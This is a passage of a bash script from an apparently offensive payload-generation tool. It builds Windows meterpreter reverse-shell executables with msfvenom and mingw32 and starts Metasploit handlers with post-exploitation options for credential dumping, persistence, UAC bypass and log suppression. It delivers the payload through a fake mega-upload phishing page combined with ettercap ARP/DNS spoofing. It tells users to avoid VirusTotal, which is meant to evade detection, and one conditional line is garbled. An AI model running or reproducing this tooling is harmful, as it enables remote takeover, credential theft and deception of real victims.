           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
         else

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi
         fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.exe on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.exe|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.exe|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.exe|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.exe|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/exec_bin[bak].c $InJEc3 > /dev/null 2>&1
mv $IPATH/templates/exec_bin2[bak].c $IPATH/templates/exec_bin2.c > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}




# -----------------------------------------------------
# build shellcode in PSH-CMD format (windows-platforms)
# using a C template embbebed with powershell shellcode
# ------------------------------------------------------
sh_shellcode6 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: psh-cmd" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="psh-cmd";fi

echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi

echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : PSH-CMD -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode (msf encoded)
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"
fi


str0=`cat $IPATH/output/chars.raw | awk {'print $12'}`
echo "$str0" > $IPATH/output/chars.raw
# display shellcode
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 3
echo $str0
echo "" && echo ""


   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc15 ]; then
      echo "[☠] exec_psh.c -> found!"
      sleep 2
   else
      echo "[☠] exec_psh.c -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw  -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw  -> not found!"
      exit
      fi

   # check if mingw32 exists
   audit=`which $ComP`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "[☠] mingw32 compiler -> found!"
      sleep 2
 
   else

      echo "[☠] mingw32 compiler -> not found!"
      echo "[☠] Download compiler -> apt-get install mingw32"
      echo ""
      sudo apt-get install mingw32
      echo ""
      fi


# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cd $IPATH/templates
cp $InJEc15 $IPATH/templates/exec_psh[bak].c
echo "[☠] Injecting shellcode -> $N4m.exe!"
sleep 2
sed "s|InJ3C|$str0|" exec_psh.c > final.c


# COMPILING SHELLCODE USING mingw32
echo "[☠] Compiling using mingw32..."
sleep 2
# special thanks to astr0baby for mingw32 -mwindows flag :D
$ComP final.c -o $N4m.exe -mwindows
mv $N4m.exe $IPATH/output/$N4m.exe


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.exe\n\nchose how to deliver: $N4m.exe" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.exe on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.exe|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.exe|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.exe|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.exe|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ]; thenif [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/exec_psh[bak].c $InJEc15 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/templates/final.c > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}




# ------------------------------------------------------------
# build shellcode in ruby (windows-platforms)
# veil-evasion ruby payload reproduction (the stager)...
# ruby_stager (template) by: @G0tmi1k @chris truncker @harmj0y
# ------------------------------------------------------------
sh_shellcode7 () {
# get user input to build shellcode
